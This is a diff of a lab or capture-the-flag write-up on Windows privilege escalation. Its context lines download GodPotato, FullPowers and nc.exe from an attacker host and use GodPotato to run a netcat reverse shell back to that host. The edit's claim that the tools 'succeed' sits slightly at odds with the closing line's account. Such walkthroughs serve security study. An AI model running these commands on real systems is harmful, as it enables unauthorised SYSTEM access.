@@ -253,7 +253,7 @@ PrintSpoofer64.exe -i -c cmd
 
 PrintSpoofer failed.
 
-We upload `GodPotato.exe` and `FullPowers.exe`, but these also fail.
+We upload `GodPotato.exe` and `FullPowers.exe`, and these succeed!
 
 ```bash
 wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
@@ -275,12 +275,10 @@ powershell -c "Invoke-WebRequest -Uri http://192.168.49.63/GodPotato.exe -OutFil
 powershell -c "Invoke-WebRequest -Uri http://192.168.49.63/nc.exe -OutFile ./nc.exe"
 powershell -c "Invoke-WebRequest -Uri http://192.168.49.63/FullPowers.exe -OutFile ./FullPowers.exe"
 
-
 FullPowers.exe
 
 # start nc -nvlp 5555 in a separate tab
 GodPotato.exe -cmd "nc.exe 192.168.49.63 5555 -e cmd.exe"
-
 ```
 
 Our `GodPotato.exe` works after running `cve-2020-0796-local.exe`. We have SYSTEM access.
